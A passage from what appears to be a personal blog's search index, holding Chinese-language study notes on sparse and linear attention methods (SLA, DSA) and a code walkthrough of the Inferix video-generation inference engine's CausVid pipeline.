<p>\u6700\u540e\u6211\u4eec\u6765\u770bAttention\u8ba1\u7b97\uff0c\u8fd9\u91cc\u662f\u4e00\u4e2aTriton\u7b97\u5b50\u4e86\uff0c\u4e4b\u524d\u5728Pooling\u4e2d\u5176\u5b9e\u4e5f\u7528\u5230\u4e86Triton\u7b97\u5b50\uff0c\u5b83\u91cc\u9762\u4e5f\u6709\u4e00\u4e2a\u8ba1\u7b97Attention\u5f62\u6210block size\u7684Attention Score\u7684\u8fc7\u7a0b</p>"},{"location":"reading/interesting/Efficient%20Attention/#22-recitified-sparse-attention","title":"2.2. Recitified Sparse Attention","text":"<p>https://arxiv.org/abs/2511.19835</p> <p>\u77eb\u6b63\u7684\u7a00\u758f\u6ce8\u610f\u529b\u673a\u5236</p>"},{"location":"reading/interesting/Efficient%20Attention/#dsa","title":"DSA","text":"<p>DeepSeek \u63d0\u51fa\u7684Sparse Attention\u673a\u5236</p>"},{"location":"reading/interesting/Efficient%20Attention/#why-sparse-attention","title":"why sparse attention","text":"<p>\u4ece\u73b0\u6709\u7684\u5de5\u4f5c\u6765\u770b\uff0cattention\u673a\u5236\u7684\u8ba1\u7b97\u662f\u6709\u5f88\u5927\u7684\u5197\u4f59\u7684\uff0c\u4e0d\u8bba\u662f\u5728video\u4efb\u52a1\u4e0a\u8fd8\u662f\u6587\u672c\u4efb\u52a1\u4e0a\u3002\u4eceTransformer\u7ed3\u6784\u4e0a\u6765\u770b\uff0c\u6838\u5fc3\u7684\u4e24\u5927\u5757\u5c31\u662fAttention+FFN</p> <p>\u4e24\u5c42\u5404\u53f8\u5176\u804c\uff0cAttention\u5c42\u7528\u4e8e\u6355\u83b7\u8f93\u5165\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u4f46\u662f\u663e\u7136\u8fd9\u91cc\u6709\u5f88\u591a\u7684\u5197\u4f59\uff0c\u6bd4\u5982\u6587\u672c\uff0c\u4e0d\u662f\u6bcf\u4e2atoken\u90fd\u548c\u5176\u4ed6\u7684token\u90a3\u4e48\u6709\u5173\u7cfb\uff0c\u8fd9\u548c\u4eba\u7c7b\u7684\u9605\u8bfb\u4e60\u60ef\u662f\u4e00\u81f4\u7684\uff0cvideo &amp; image \u5c31\u66f4\u662f\u5982\u6b64\u4e86\uff0c\u672c\u8eab\u5c31\u6709\u5f88\u5f3a\u7684\u5c40\u90e8\u5173\u8054\u6027\uff0c\u9ad8\u5206\u8fa8\u7387\u573a\u666f\u4e0b\u5197\u4f59\u66f4\u591a\uff0c\u56e0\u6b64\u5bf9\u4e8eAttention\u505a\u7a00\u758f\u8ba1\u7b97\u548cKV cache\u538b\u7f29\uff0c\u6548\u679c\u663e\u8457\u3002</p> <p>\u800c\u5bf9\u4e8eFFN\uff0c\u5b83\u627f\u8f7d\u7740\u6a21\u578b\u7684\u4e16\u754c\u77e5\u8bc6\uff0c\u6a21\u578b\u5bf9\u4e8e\u4e16\u754c\u77e5\u8bc6\u7684\u8bb0\u5fc6\u548c\u6a21\u578b\u7684FFN\u53c2\u6570\u6210\u6b63\u76f8\u5173\uff0c\u56e0\u6b64\u5982\u679c\u8981\u5bf9FFN\u505a\u7a00\u758f\uff0c\u76f8\u5f53\u4e8e\u8ba9\u6a21\u578b\u5fd8\u8bb0\u4e00\u4e9b\u77e5\u8bc6\uff0c\u4f46\u662f\u5728\u5404\u79cd\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5f80\u5f80\u4e0d\u77e5\u9053\u54ea\u4e9b\u77e5\u8bc6\u662f\u53ef\u4ee5\u88ab\u5fd8\u8bb0\uff0c\u66f4\u91cd\u8981\u7684\u662f\uff0c\u6211\u4eec\u4e0d\u77e5\u9053\u53bb\u6389\u8fd9\u4e2aconnection\u6216\u8005\u795e\u7ecf\u5143\uff0c\u4f1a\u635f\u5931\u54ea\u4e9b\u77e5\u8bc6\uff0c\u56e0\u6b64\u5bf9\u4e8eFFN\u505a\u7a00\u758f\u8ba1\u7b97\u7684\u5de5\u4f5c\u90fd\u96be\u4ee5\u751f\u6548</p> <p>\u5e76\u4e14\u901a\u8fc7Moe\u8fd9\u4e2a\u505a\u6cd5\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u51fa\u6765\u8fd9\u4e00\u70b9\uff0c\u968f\u7740\u4eba\u4eec\u5bf9\u4e8eFFN\u5c42\u7684\u53c2\u6570\u505a\u6269\u5c55\uff0c\u6a21\u578b\u80fd\u591f\u638c\u63e1\u7684\u77e5\u8bc6\u8d8a\u6765\u8d8a\u591a\uff0c\u5c24\u5176\u662f\u5728\u5927\u89c4\u6a21\u9884\u8bad\u7ec3\u9636\u6bb5\uff0cMoe\u505a\u7684\u76f8\u5f53\u5f97\u597d</p> <p>\u73b0\u9636\u6bb5\u7684\u7406\u89e3\u662f\u8fd9\u6837\uff0c\u4e5f\u53ef\u4ee5\u770b\u4e00\u4e9b\u5bf9\u4e8eFFN\u505aSparse\u7684\u8bba\u6587\u6765\u4e86\u89e3\u4e00\u4e0b\u771f\u5b9e\u7684\u573a\u666f\uff0c\u5173\u4e8eFFN\u90a3\u8fb9\u7684Efficience\u7684\u5de5\u4f5c\u6709\u5f88\u591a\u662f\u56f4\u7ed5\u7740activation\u8fdb\u884c\u7684</p> <ul> <li>Spark Transformer</li> </ul>"},{"location":"reading/interesting/Efficient%20Attention/#3-linear-attention","title":"3. Linear Attention","text":"<p>Linear Attention\u7684\u4e3b\u6d41\u505a\u6cd5\u662f\uff0c\\(softmax(QK^T)V\\) \u8fd9\u4e2a\u8ba1\u7b97\u8f6c\u6362\u6210\uff0c\\(Qsim(K^TV)\\) \uff0c\u4e5f\u5c31\u662f\u4f7f\u7528\u67d0\u4e9b\u8ba1\u7b97\u624b\u6bb5\uff0c\u6765\u5148\u8ba1\u7b97KV\u8fd9\u4e00\u5757\uff0c\u8fd9\u6837\u5b50\u53ef\u4ee5\u4f7f\u5f97\u5176\u8ba1\u7b97\u590d\u6742\u5ea6\u53d8\u4e3a\u4e00\u4e2a\u7ebf\u6027\u72b6\u6001\uff0c\u56e0\u4e3aKV\u7684\u8ba1\u7b97\u7ed3\u679c\u662f\u4e00\u4e2adxd\u7684\u77e9\u9635</p> <p></p> <p>\u4f46\u662fLinear attention\u7684\u6548\u679c\u4e4b\u6240\u4ee5\u8fd8\u662f\u65e0\u6cd5\u903c\u8fd1Full Attention\uff0c\u662f\u56e0\u4e3aLinearAttention\u8ba1\u7b97\u51fa\u6765\u7684\u77e9\u9635\u7684\u4f4e\u79e9\u6027</p>"},{"location":"reading/interesting/Efficient%20Attention/#31-sla","title":"3.1. SLA","text":"<p>\u8fd9\u662fSageAttention\u548cSpargeAttention\u7684\u7cfb\u5217\u5de5\u4f5c\u4e4b\u4e00\uff0c\u5728\u8fd9\u4e9b\u57fa\u7840\u4e0a\u52a0\u4e0a\u4e86Linear Attention\uff0c\u8fbe\u5230\u66f4\u9ad8\u7684\u6027\u80fd\u3002\u8bba\u6587\u5206\u6790\u53d1\u73b0\uff0cAttention\u8ba1\u7b97\u7684\u6743\u91cd\u4e2d\uff0c\u5929\u7136\u53ef\u4ee5\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206</p> <ul> <li>\u9ad8\u6743\u91cd\u4e14high-rank</li> <li>low rank\u6743\u91cd</li> </ul> <p>\u81ea\u7136\u7684\uff0c\u6211\u4eec\u8003\u8651\u5c06Sparse Accelerate\u7ed9high-rank\u6743\u91cd\u52a0\u901f\uff0c\u7528low-rank\u65b9\u6848\uff08Linear\u65b9\u6848\uff09\u7ed9low-rank\u6743\u91cd\u52a0\u901f\uff0c\u4e8e\u662f\u5c31\u6709\u4e86\u5bf9\u5e94\u7684\u5de5\u4f5c\u8fc7\uff0cSparse-Linear Attention\uff0c\u4e3b\u8981\u662f\u9488\u5bf9\u7684Dit\uff0c\u4e5f\u5c31\u662f\u89c6\u9891\u751f\u6210\u8fd9\u4e2a\u9886\u57df\uff0c\u4e0d\u4ec5\u652f\u6301Forward\u4e5f\u652f\u6301Backward\uff0c\u8fd9\u662f\u4e00\u4e2atrainable\u7684\u65b9\u6848</p> <p>\u5728\u6d41\u7a0b\u4e2dSLA\u5c06Attention\u6743\u91cd\u5206\u4e3a\u4e86\u4e09\u4e2a\u90e8\u5206\uff0c\u5206\u522b\u91c7\u7528N2\u7684full attention\u548cN1\u7684Linear Attention\u4ee5\u53ca\u4e22\u5f03\u7684\u64cd\u4f5c\u3002</p> <p>Baseline</p> <p>SLA\u57fa\u4e8eBlock Sparse Attention(\u6309\u7167Block\u8ba1\u7b97Attention Score\u5e76\u4e14\u8fdb\u884cdrop)\u4ee5\u53caLinear Attention\uff08\u5148\u8ba1\u7b97KV\uff0c\u518d\u5f52\u4e00\u5316\uff09</p> <p></p> <p>Motivation</p> <p>SLA\u7684\u63a8\u8fdb\u57fa\u4e8e\u4e24\u4e2a\u53d1\u73b0</p> <ul> <li>Softmax\u77e9\u9635\u7684\u7a00\u758f\u6027</li> <li>Full Attention\u77e9\u9635\u7684low rank\u6027\u8d28</li> </ul> <p></p> <p></p> <p>SLA Method</p> <p></p>"},{"location":"reading/interesting/Inferix/","title":"Inferix","text":"<p>\u8bba\u6587\u94fe\u63a5\u5728\u8fd9\u91cc \uff0c\u8fd9\u662f\u4e00\u7bc7\u65e8\u5728\u6784\u5efa\u73b0\u4ee3\u4e16\u754c\u6a21\u578b\u7684\u63a8\u7406\u5f15\u64ce\u7684\u6587\u7ae0\uff0c\u5bf9\u6807vllm\uff0csglang\u7b49\u5bf9\u4e8e\u8bed\u8a00\u6a21\u578b\u7684\u4f18\u5316\u3002 inferix\u4e3b\u8981\u662f\u5bf9\u4e8e\u957f\u65f6\u95f4\uff0c\u9ad8\u8d28\u91cf\uff0c\u53ef\u4ea4\u4e92\u7684video generation\u7684\u63a8\u7406\u4f18\u5316</p> <p>\u5f15\u5165\u4e86\u5e8f\u5217\u5e76\u884c\uff0c\u4f4e\u6bd4\u7279\u91cf\u5316\uff0c\u7a00\u758fAttention\uff0c\u5206\u5e03\u5f0f\u5e76\u884c\u7b49\u52a0\u901f\u624b\u6bb5</p> <p>\u6211\u901a\u8fc7claude code\u8f85\u52a9\u8fdb\u884c\u4e86\u8fd9\u4e2acodebase\u7684\u7406\u89e3</p> <pre><code>Inferix/\n\u251c\u2500\u2500 inferix/                    # \u6838\u5fc3\u6846\u67b6\u4ee3\u7801\n\u2502   \u251c\u2500\u2500 core/                   # \u6838\u5fc3\u6a21\u5757\n\u2502   \u251c\u2500\u2500 distributed/            # \u5206\u5e03\u5f0f\u63a8\u7406\u652f\u6301\n\u2502   \u251c\u2500\u2500 kvcache_manager/        # KV\u7f13\u5b58\u7ba1\u7406\n\u2502   \u251c\u2500\u2500 models/                 # \u6a21\u578b\u5b9e\u73b0\n\u2502   \u251c\u2500\u2500 pipeline/               # \u63a8\u7406\u7ba1\u7ebf\n\u2502   \u2514\u2500\u2500 profiling/              # \u6027\u80fd\u5206\u6790\n\u251c\u2500\u2500 example/                    # \u793a\u4f8b\u548c\u914d\u7f6e\n\u2502   \u251c\u2500\u2500 self_forcing/           # Self-Forcing\u6a21\u578b\u793a\u4f8b\n\u2502   \u251c\u2500\u2500 causvid/                # CausVid\u6a21\u578b\u793a\u4f8b\n\u2502   \u251c\u2500\u2500 magi/                   # MAGI\u6a21\u578b\u793a\u4f8b\n\u2502   \u251c\u2500\u2500 quantization/           # \u91cf\u5316\u793a\u4f8b\n\u2502   \u251c\u2500\u2500 profiling/              # \u6027\u80fd\u5206\u6790\u793a\u4f8b\n\u2502   \u2514\u2500\u2500 rtmp_streaming/         # \u89c6\u9891\u6d41\u793a\u4f8b\n\u251c\u2500\u2500 LV-Bench/                   # \u957f\u89c6\u9891\u57fa\u51c6\u6d4b\u8bd5\n\u2514\u2500\u2500 tests/                      # \u6d4b\u8bd5\u4ee3\u7801\n</code></pre>"},{"location":"reading/interesting/Inferix/#0","title":"0. \u7406\u89e3\u63a8\u7406\u6846\u67b6","text":"<p>\u5728\u9605\u8bfb\u63a8\u7406\u6846\u67b6\u4e4b\u524d\u6211\u4eec\u8981\u4e86\u89e3\u4e00\u4e2a\u95ee\u9898\uff0c\u6a21\u578b\u53c2\u6570\u548c\u63a8\u7406\u6846\u67b6\u7684\u4ee3\u7801\u662f\u5982\u4f55\u4e92\u52a8\u7684</p> <p>\u6211\u4eec\u6709\u4e24\u4e2a\u90e8\u5206\uff0c\u4e00\u4e2a\u662f\u6a21\u578b\u7684\u6743\u91cd\uff0c\u4f8b\u5982 <code>model.safetensors</code> \u8fd9\u7c7b\uff0c\u5f53\u6211\u4eec\u4f7f\u7528vllm\u8fd9\u7c7b\u7684\u6846\u67b6\u65f6\uff0c\u4f1a\u8fdb\u884c\u5982\u4e0b\u7684\u64cd\u4f5c</p> <pre><code>from vllm import LLM\n\nmodel = LLM(model=\"meta-llama/Llama-2-7b-hf\")\n</code></pre> <p>\u800c\u5728\u5176\u5185\u90e8\uff0c\u5219\u4f1a\u5c06\u8fd9\u4e9b\u6743\u91cd\u8fdb\u884c\u5c01\u88c5\uff0c\u4eba\u4eec\u5728\u53d1\u5e03\u6a21\u578b\u7684\u65f6\u5019\u4f1a\u6807\u8bb0\u597d\u53c2\u6570\u7684\u6743\u91cd\u7684\u542b\u4e49</p> <p>\u6211\u4eec\u7b80\u5316vllm\u5185\u90e8\u7684\u5b9e\u73b0\uff0c\u5927\u6982\u662f\u8fd9\u4e2a\u6837\u5b50\u7684</p> <pre><code># \u7b80\u5316\u793a\u4f8b\uff1avLLM \u5185\u90e8\u7684\u6743\u91cd\u52a0\u8f7d\u903b\u8f91\ndef load_weights(model, hf_model_path):\n    # 1. \u4ece HuggingFace \u52a0\u8f7d\u6743\u91cd\n    state_dict = torch.load(f\"{hf_model_path}/pytorch_model.bin\")\n\n    # 2. \u6743\u91cd\u540d\u79f0\u6620\u5c04\n    # HF: model.layers.0.self_attn.q_proj.weight\n    # vLLM: model.layers.0.attention.qkv_proj.weight (\u5408\u5e76\u7684QKV)\n\n    for name, param in model.named_parameters():\n        if \"qkv_proj\" in name:\n            # vLLM \u53ef\u80fd\u4f1a\u5408\u5e76 Q\u3001K\u3001V \u6743\u91cd\u4ee5\u4f18\u5316\u6027\u80fd\n            layer_idx = extract_layer_idx(name)\n            q_weight = state_dict[f\"layers.{layer_idx}.self_attn.q_proj.weight\"]\n            k_weight = state_dict[f\"layers.{layer_idx}.self_attn.k_proj.weight\"]\n            v_weight = state_dict[f\"layers.{layer_idx}.self_attn.v_proj.weight\"]\n\n            # \u5408\u5e76\u6743\u91cd\n            qkv_weight = torch.cat([q_weight, k_weight, v_weight], dim=0)\n            param.data.copy_(qkv_weight)\n</code></pre> <p>\u6211\u4eec\u4f1a\u4ece\u6743\u91cd\u4e2d\u83b7\u53d6\u5230 q k v \u7684\u6743\u91cd\uff0c\u968f\u540e\u6211\u4eec\u8981\u8fdb\u884cflash attention\u8fd8\u662f\u5206\u5e03\u5f0f\u64cd\u4f5c\uff0c\u5c31\u968f\u7740\u63a8\u7406\u6846\u67b6\u7684\u4ee3\u7801\u8d70</p>"},{"location":"reading/interesting/Inferix/#1-pipeline","title":"1. pipeline","text":"<p>\u8be5\u9879\u76ee\u7684\u6838\u5fc3\u63a5\u53e3\u662f\u4e00\u4e2apipeline\uff0c\u5176\u652f\u6301\u4ee5\u4e0b\u4e09\u79cd\u5b9e\u73b0</p> <p>Self-Forcing \u5176\u6d41\u7a0b\u662f\u5355\u4e00\u63d0\u793a\u8bcd\u751f\u6210\uff0c\u652f\u6301T2V\u548cI2V</p> <ul> <li>\u57fa\u7840\u6a21\u578b: Wan2.1-T2V-1.3B</li> <li>\u6838\u5fc3\u6280\u672f: DMD (Distribution Matching Distillation)</li> <li>\u67b6\u6784\u7279\u70b9:<ul> <li>\u4f7f\u7528\u56e0\u679c\u6269\u6563\u6a21\u578b (CausalDiffusionInferencePipeline)</li> <li>\u652f\u6301 EMA (Exponential Moving Average) \u6743\u91cd</li> <li>\u57fa\u4e8e Wan Base \u6269\u5c55</li> </ul> </li> </ul> <p>CausVid \u5176\u6d41\u7a0b\u662f\u8fde\u7eed\u63d0\u793a\u8bcd\u751f\u6210\uff0c\u4ee5\u53ca\u4ea4\u4e92\u5f0f\u7684\u63d0\u793a\u8f93\u5165</p> <ul> <li>\u57fa\u7840\u6a21\u578b: Wan2.1-T2V-1.3B</li> <li>\u6838\u5fc3\u6280\u672f: \u56e0\u679c\u89c6\u9891\u751f\u6210\uff08Causal Video\uff09</li> <li>\u67b6\u6784\u7279\u70b9:<ul> <li>\u4f7f\u7528\u56e0\u679c\u63a8\u7406\u7ba1\u7ebf (CausalInferencePipeline)</li> <li>\u652f\u6301 rollout \u673a\u5236\u751f\u6210\u66f4\u957f\u89c6\u9891</li> <li>\u57fa\u4e8e Wan Base \u6269\u5c55</li> </ul> </li> </ul> <p>MAGI \u652f\u6301V2V</p> <ul> <li>\u57fa\u7840\u6a21\u578b: \u72ec\u7acb\u7684\u591a\u6a21\u6001\u67b6\u6784</li> <li>\u6838\u5fc3\u6280\u672f: \u5b8c\u5168\u72ec\u7acb\u7684 DiT (Diffusion Transformer) \u67b6\u6784</li> <li>\u67b6\u6784\u7279\u70b9:<ul> <li>\u5b8c\u5168\u72ec\u7acb\u7684\u6a21\u578b\u5b9e\u73b0\uff08DiT + VAE + T5\uff09</li> <li>\u4e0d\u4f9d\u8d56 Wan Base</li> <li>\u652f\u6301\u591a\u79cd\u89c4\u6a21\uff084.5B \u548c 24B\uff09</li> </ul> </li> </ul> <p>\u6211\u4eec\u6765\u7ec6\u770b\u4e00\u4e0bCausVid\u7684\u4ee3\u7801\uff0c\u4e5f\u5c31\u662f\u57fa\u4e8ewan\u6a21\u578b\u7684\u4ea4\u4e92\u6027\u751f\u6210\u7684pipeline\uff0c\u8fd9\u4e2a\u90e8\u5206\u6709\u4e24\u4e2a\u4ee3\u7801</p> <ul> <li><code>CausalInferencePipeline.py</code> \u8fd9\u4e2a\u662f\u5e95\u5c42\u7684\u63a8\u7406\uff0c\u8f93\u5165\u7684\u566a\u58f0\u548c\u63d0\u793a\uff0c\u7ed9\u51fa\u751f\u6210\u7684video</li> <li><code>pipeline.py</code> \u8fd9\u4e2a\u662f\u4e0a\u5c42\u7684\u63a5\u53e3\uff0c\u5176\u7f16\u6392\u6574\u4e2a\u751f\u6210\u6d41\u7a0b\uff0c\u5e76\u4fdd\u5b58\u7ed3\u679c</li> </ul> <p>CausalInferencePipeline</p> <p>\u8fd9\u4e2a\u4ee3\u7801\u7684\u6838\u5fc3\u90e8\u5206\u5982\u4e0b</p> <pre><code>class CausalInferencePipeline(torch.nn.Module):\n    def __init__(\n            self,\n            args,\n            wan_base_model_path,\n            device,\n            enable_kv_offload,\n            parallel_config: Optional[ParallelConfig] = None\n    ):\n        super().__init__()\n\n        self.parallel_config = parallel_config\n\n        # Step 1: Initialize all models\n        # Get model path from configuration (following README path convention)\n        model_path = wan_base_model_path if wan_base_model_path is not None else 'weights/Wan2.1-T2V-1.3B'\n        self.generator = WanDiffusionWrapper(\n            model_path=model_path,\n            **getattr(args, \"model_kwargs\", {}), enable_kv_offload=enable_kv_offload, parallel_config=parallel_config).to(device)\n        self.text_encoder = WanTextEncoder(model_path=model_path)\n        self.vae = WanVAEWrapper(model_path=model_path)\n\n        if dist.is_initialized():\n            dist.barrier()\n\n        # Step 2: Initialize all causal hyperparmeters\n        ...\n\n    # Other Method\n    ...\n\n        def inference(self, noise: torch.Tensor, text_prompts: List[str], start_latents: Optional[torch.Tensor], return_latents: bool = True, kv_cache_manager: Optional[KVCacheManager] = None, kv_cache_requests: Optional[List] = None) -&gt; torch.Tensor:\n        \"\"\"\n        Perform inference on the given noise and text prompts.\n        Inputs:\n            noise (torch.Tensor): The input noise tensor of shape\n                (batch_size, num_frames, num_channels, height, width).\n            text_prompts (List[str]): The list of text prompts.\n        Outputs:\n            video (torch.Tensor): The generated video tensor of shape\n                (batch_size, num_frames, num_channels, height, width). It is normalized to be in the range [0, 1].\n        \"\"\"\n        batch_size, num_frames, num_channels, height, width = noise.shape\n\n        ...\n\n        if return_latents:\n            return video, output\n        else:\n            return video\n</code></pre> <p>\u4e3b\u4f53\u90e8\u5206\u662f\u521d\u59cb\u5316\u548c\u63a8\u7406\uff0c\u521d\u59cb\u5316\u90e8\u5206\u4e3b\u8981\u662f\u8fd9\u4e09\u4e2a\u6a21\u578b\uff0c\u4e00\u4e2awan\u6a21\u578b\u7684\u57fa\u5ea7\uff0c\u4e00\u4e2a\u6587\u672c\u7f16\u7801\u5668\uff0c\u4e00\u4e2avae</p> <pre><code>        self.generator = WanDiffusionWrapper(...)\n        self.text_encoder = WanTextEncoder(model_path=model_path)\n        self.vae = WanVAEWrapper(model_path=model_path)\n</code></pre> <p>\u8fd9\u4e9b\u90e8\u5206\u7684\u5b9e\u73b0\u90fd\u653e\u5728 model/ \u6587\u4ef6\u5939\u4e0b</p> <p>\u4e3b\u8981\u6765\u770b\u63a8\u7406\u90e8\u5206\uff0c\u63a8\u7406\u7684\u4e3b\u5e72\u90e8\u5206\u662f\u4e24\u4e2a\u5faa\u73af\uff0c\u56e0\u4e3a\u5176\u8bbe\u8ba1\u662fblock diffusion\uff0c\u6bcf\u4e2ablock\u5757\u5185\u6839\u636e\u65f6\u95f4\u6b65\u8fdb\u884cdiffusion\uff0c\u7136\u540e\u5916\u4fa7\u7684\u5faa\u73af\u662fAR\u7684\u8fc7\u7a0b</p> <pre><code>    for block_index in range(num_blocks):\n        noisy_input = noise[:, block_index *\n                            self.num_frame_per_block:(block_index + 1) * self.num_frame_per_block]\n        ... # \u5224\u5b9a\u662f\u5426\u8981\u586b\u5145start_latents\n        for index, current_timestep in enumerate(self.denoising_step_list):\n            # \u8fed\u4ee3\u53bb\u566a\n            ...\n        # \u66f4\u65b0kv-cache\n        ...\n</code></pre> <p>\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a<code>start_latents</code>\u7684\u53c2\u6570\uff0c\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u4e8eimage2video\u548cvideo2video\u7684\u4efb\u52a1\uff0c\u8fd9\u4e2a\u53c2\u6570\u8868\u793a\u7684\u751f\u6210\u5f00\u5934\u7684\u524d\u51e0\u5e27\u7684latents\uff0c\u6bd4\u5982\u6211\u4eec\u5728image2video\u7684\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u4f1a\u5148\u8ba1\u7b97\u597d\u8fd9\u4e2aimage\u7684latents\uff0c\u7136\u540e\u76f4\u63a5\u5c06\u5176\u7eb3\u5165\u5230\u751f\u6210\u7684pipeline\u4e2d\uff0c\u4e5f\u5c31\u662f\u751f\u6210\u7684\u524d\u51e0\u5e27\u5e76\u4e0d\u9700\u8981\u53bb\u566a\uff0c\u800c\u662f\u76f4\u63a5\u5c06\u8fd9\u4e9bimages\u7684latents\u586b\u5145\u8fdb\u5165pipeline\u4e2d\uff0c\u5e76\u4e14\u66f4\u65b0kv-cache</p> <pre><code>if start_latents is not None and block_index &lt; num_input_blocks:\n    # \u8bbe\u7f6e timestep \u4e3a0\uff0c\u6807\u8bb0\u8fd9\u4e3a\u53bb\u566a\u5b8c\u6210\u7684\u5e27\n    timestep = torch.ones(\n        [batch_size, self.num_frame_per_block], device=noise.device, dtype=torch.int64) * 0\n    # \u63d0\u53d6\u5f53\u524d\u5757\u7684\u53c2\u8003\u5e27\n    current_ref_latents = start_latents[:, block_index * self.num_frame_per_block:(\n        block_index + 1) * self.num_frame_per_block]\n    # \u76f4\u63a5\u590d\u5236\u5230\u8f93\u51fa\n    output[:, block_index * self.num_frame_per_block:(\n        block_index + 1) * self.num_frame_per_block] = current_ref_latents\n    # \u586b\u5145kv-cache\n    self.generator(\n        noisy_image_or_video=current_ref_latents,\n        conditional_dict=conditional_dict,\n        timestep=timestep * 0,\n        current_start=block_index * self.num_frame_per_block * self.frame_seq_length,\n        current_end=(block_index + 1) * self.num_frame_per_block * self.frame_seq_length,\n        kv_start=block_index * self.num_frame_per_block * self.per_rank_frame_seq_length,\n        kv_end=(block_index + 1) * self.num_frame_per_block * self.per_rank_frame_seq_length,\n        kv_cache_manager=kv_cache_manager,\n        kv_cache_requests=kv_cache_requests,\n    )\n    continue # \u586b\u5145\u5b8c\u6210\u4e4b\u540e\u8fdb\u5165\u4e0b\u4e00\u6b65\u5faa\u73af\n</code></pre> <p>\u8fc7\u4e86\u8fd9\u4e2astart_latents\u7684\u5224\u65ad\u4e4b\u540e\uff0c\u5c31\u662f\u8fdb\u5165\u4e86\u53bb\u566a\u7684\u8fc7\u7a0b\uff0c\u53bb\u566a\u7684\u8fc7\u7a0b\u975e\u5e38\u76f4\u63a5\uff0c\u5c31\u662f\u4f20\u7edf\u7684ddpm\u7684\u8fc7\u7a0b</p> <pre><code>for index, current_timestep in enumerate(self.denoising_step_list):\n    # set current timestep\n    timestep = torch.ones(\n        [batch_size, self.num_frame_per_block], device=noise.device, dtype=torch.int64) * current_timestep\n\n    if index &lt; len(self.denoising_step_list) - 1:\n\n        # \u53bb\u566a\n        denoised_pred = self.generator(\n            noisy_image_or_video=noisy_input,\n            conditional_dict=conditional_dict,\n            timestep=timestep,\n            ...\n        )\n        ... # \u4e2d\u95f4\u5904\u7406\n\n        # \u52a0\u566a\n        noisy_input_flat = self.scheduler.add_noise(\n            denoised_pred.flatten(0, 1),\n            torch.randn_like(denoised_pred.flatten(0, 1)),\n            timestep_tensor\n        )\n        # Ensure result is not None before view operation\n        if noisy_input_flat is not None:\n            noisy_input = noisy_input_flat.view(denoised_pred.shape)\n        else:\n            raise RuntimeError(\"scheduler.add_noise returned None\")\n    else:\n        # \u6700\u540e\u4e00\u6b65\uff0c\u83b7\u5f97\u6700\u7ec8\u8f93\u51fa\n        denoised_pred = self.generator(\n            noisy_image_or_video=noisy_input,\n            conditional_dict=conditional_dict,\n            timestep=timestep,\n            ...\n        )\n</code></pre> <p>\u5728\u5b8c\u6210\u4e00\u4e2ablock\u7684diffusion\u4e4b\u540e\uff0c\u5728\u6700\u540e\u4e00\u6b65\u518d\u8c03\u7528\u4e00\u904dgenerator\uff0c\u66f4\u65b0kv-cache</p> <p>pipeline</p> <p>\u6211\u4eec\u770b\u5b8c\u4e86\u7528\u4e8e\u5b9e\u9645\u751f\u6210\u7684pipeline\uff0c\u6211\u4eec\u6765\u770b\u4e0a\u5c42\u7684\u4e1a\u52a1\u63a5\u53e3</p> <pre><code>\u7528\u6237\u8c03\u7528\n   \u2193\nCausVidPipeline (\u4e1a\u52a1\u5c42)\n   \u2193\nCausalInferencePipeline (\u5e95\u5c42\u53bb\u566a)\n   \u2193\nGenerator (DiT/Transformer \u6a21\u578b)\n</code></pre> <p>pipeline\u4e2d\u4e3b\u8981\u662f\u5904\u7406\u5982\u4f55\u5206\u914d\u6bcf\u4e00\u6b21\u751f\u6210\u548c\u4e0a\u4e00\u6b21\u751f\u6210\u7684start_latents\u7684\u5173\u7cfb</p> <pre><code>\u5047\u8bbe num_overlap_frames = 3\n\n\u7b2c\u4e00\u8f6e\u751f\u6210\uff1a\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nFrame:  0  1  2  3  4  5  ... 17 18 19 20\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n                              \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n                           \u51c6\u5907\u4f5c\u4e3a\u4e0b\u4e00\u8f6e\u7684\n                           start_latents\n                           (Frame 18, 19, 20)\n\n\u4fdd\u5b58\u5230 all_video: Frame 0-17 (\u53bb\u6389\u91cd\u53e0\u7684 18-20)\n\n\u7b2c\u4e8c\u8f6e\u751f\u6210\uff1a\nstart_latents = [Frame 18, 19, 20] (\u6765\u81ea\u4e0a\u4e00\u8f6e)\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nFrame:  18 19 20 21 22 23 ... 35 36 37 38\n        \u2514\u2500\u2500\u56fa\u5b9a\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u65b0\u751f\u6210\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u91cd\u53e0\u2500\u2518\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n\u4fdd\u5b58\u5230 all_video: Frame 21-35 (\u53bb\u6389 18-20 \u548c 36-38)\n</code></pre>"},{"location":"reading/interesting/Inferix/#2-models","title":"2. 